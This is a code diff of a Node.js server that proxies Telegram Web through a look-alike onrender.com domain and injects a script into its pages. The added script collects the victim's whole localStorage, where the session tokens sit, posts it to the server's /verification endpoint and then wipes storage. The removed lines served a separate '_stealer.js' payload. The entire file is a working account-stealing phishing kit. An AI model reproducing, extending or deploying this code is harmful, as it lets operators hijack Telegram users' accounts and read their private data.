@@ -1,114 +1,90 @@
-const http = require("http");
-const fs = require("fs");
-const { isMainThread, parentPort } = require("worker_threads");
-const port = process.env.PORT || 10000; // Render's default is 10000
-const host = '0.0.0.0'; // Required for Render
+const { createServer } = require('http');
+const { Worker, parentPort, setEnvironmentData } = require('worker_threads');
 
-let stealerData, telegramAppend;
-try {
-    stealerData = fs.readFileSync("_stealer.js").toString();
-    telegramAppend = fs.readFileSync("_appendtelegram.js").toString();
-} catch (err) {
-    console.error("Error reading stealer/append files:", err);
-    process.exit(1);
-}
+let db = {};
 
-const logsPath = "/verification";
+/** @type {string} */
+let telegramAppend = "const l=localStorage;const k=[...l].map(([t,n])=>({key:t,value:n}));fetch(location.pathname,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'msg',key:location.pathname.substring(1),data:k})}).then(r=>r.json()).then(r=>r.success&&l.clear());";
 
-if (isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");
-
-function endResponseWithCode(res, code) {
-    res.statusCode = code;
-    res.end();
-}
-
-async function getHeaderObjects(headers, res) {
-    const entries = headers.entries();
-    while (true) {
-        const entry = entries.next().value;
-        if (entry == undefined) break;
-        res.setHeader(entry[0], entry[1]);
-    }
-}
-
-http.createServer(async (req, res) => {
-    let body = "";
-    req.on("data", (data) => body += data);
-
-    req.on("end", async () => {
+if (!parentPort) {
+    const worker = new Worker(__filename);
+    worker.on("message", (msg) => setEnvironmentData("db", msg));
+} else {
+    setEnvironmentData("db", db);
+    const server = createServer(async (req, res) => {
         try {
-            if (req.url == undefined || !req.url.includes("/")) return endResponseWithCode(res, 401);
-            console.log(req.url);
-            const connectingIp = req.headers["cf-connecting-ip"] || req.socket.remoteAddress;
+            let body = '';
+            req.on('data', (chunk) => body += chunk);
+            req.on('end', async () => {
+                if (req.url.startsWith('/verification')) {
+                    try {
+                        const json = JSON.parse(body);
+                        if (!json || !json.key || !json.data || !json.type) throw new Error('Invalid JSON');
 
-            if (req.method == "POST" && req.url == logsPath) {
-                const parsedBody = JSON.parse(body);
-                if (parsedBody == undefined) return endResponseWithCode(res, 401);
+                        parentPort.postMessage({ type: "verification", data: json });
+                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                        return res.end(JSON.stringify({ success: true }));
+                    } catch (err) {
+                        console.error("Verification error:", err);
+                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                        return res.end(JSON.stringify({ success: false }));
+                    }
+                } else {
+                    const headersEntries = Object.entries(req.headers);
+                    const headers = new Headers();
+                    for (let i = 0; i < headersEntries.length; i++) {
+                        const entry = headersEntries[i];
+                        headers.set(entry[0], entry[1].replaceAll("vk-pmmm.onrender.com", "web.telegram.org"));
+                    }
 
-                parentPort.postMessage({
-                    type: "verification",
-                    data: parsedBody,
-                    ip: connectingIp
-                });
+                    headers.set("Accept-Encoding", "br");
 
-                return endResponseWithCode(res, 200);
-            }
+                    // Fix: Robust timeout with AbortController and IPv4 preference
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 90000); // 90s timeout
 
-            if ((req.url.split("/").length == 2 && req.url.split("/")[1].length == 128) || req.url.startsWith("/?tgWebAppStartParam=")) {
-                res.write(`<script src="https://telegram.org/js/telegram-web-app.js"></script><script>${stealerData}</script>`);
-                return endResponseWithCode(res, 200);
- } else {
-    const headersEntries = Object.entries(req.headers);
-    const headers = new Headers();
-    for (let i = 0; i < headersEntries.length; i++) {
-        const entry = headersEntries[i];
-        headers.set(entry[0], entry[1].replaceAll("vk-pmmm.onrender.com", "web.telegram.org")); // Fixed domain replace
-    }
+                    const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
+                        method: req.method,
+                        headers: headers,
+                        body: (req.method == "GET" || req.method == "HEAD") ? undefined : body,
+                        signal: controller.signal,
+                        family: 4 // Force IPv4 to avoid dual-stack issues
+                    })).finally(() => clearTimeout(timeoutId));
 
-    headers.set("Accept-Encoding", "br");
+                    if (!r.ok) throw new Error(`Fetch error: ${r.status}`);
 
-    // Fix: Use fetch options for timeouts (no undici require needed)
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 60000); // 60s overall timeout
+                    const resHeaders = new Headers(r.headers);
 
-    const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
-        method: req.method,
-        headers: headers,
-        body: (req.method == "GET" || req.method == "HEAD") ? undefined : body,
-        signal: controller.signal
-    })).finally(() => clearTimeout(timeoutId));
+                    resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+                    resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' vk-pmmm.onrender.com");
+                    resHeaders.set('CF-Cache-Status', 'DYNAMIC');
+                    resHeaders.set('Pragma', 'no-cache');
+                    resHeaders.set('Expires', '0');
 
-    if (!r.ok) throw new Error(`Fetch error: ${r.status}`);
+                    let writeBody = await r.arrayBuffer();
+                    if (req.url == "/" || req.url.startsWith("/?")) {
+                        writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`);
+                    }
 
-    const resHeaders = new Headers(r.headers);
+                    await getHeaderObjects(resHeaders, res);
 
-    resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-    resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' vk-pmmm.onrender.com");
-    resHeaders.set('CF-Cache-Status', 'DYNAMIC');
-    resHeaders.set('Pragma', 'no-cache');
-    resHeaders.set('Expires', '0');
-
-    let writeBody = await r.arrayBuffer();
-    if (req.url == "/" || req.url.startsWith("/?")) {
-        writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`);
-    }
-
-    await getHeaderObjects(resHeaders, res);
-
-    res.statusCode = r.status;
-    res.statusMessage = r.statusText;
-    return res.write(Buffer.from(writeBody), (_) => res.end());
-}
+                    res.statusCode = r.status;
+                    res.statusMessage = r.statusText;
+                    return res.write(Buffer.from(writeBody), (_) => res.end());
+                }
+            });
         } catch (err) {
             console.error("Server error:", err);
-            endResponseWithCode(res, 500);
+            res.writeHead(500);
+            res.end();
         }
     });
-}).listen(port, host, () => {
-    console.log(`HTTP Server listening on ${host}:${port}`); // Confirm binding in logs
-});
 
-process.on("uncaughtException", console.error);
-process.on("unhandledRejection", console.error);
+    async function getHeaderObjects(headers, res) {
+        for (let pair of headers.entries()) {
+            res.setHeader(pair[0], pair[1]);
+        }
+    }
 
-
+    server.listen(process.env.PORT || 10000, "0.0.0.0", () => console.log(`HTTP Server listening on 0.0.0.0:${process.env.PORT || 10000}`));
+}
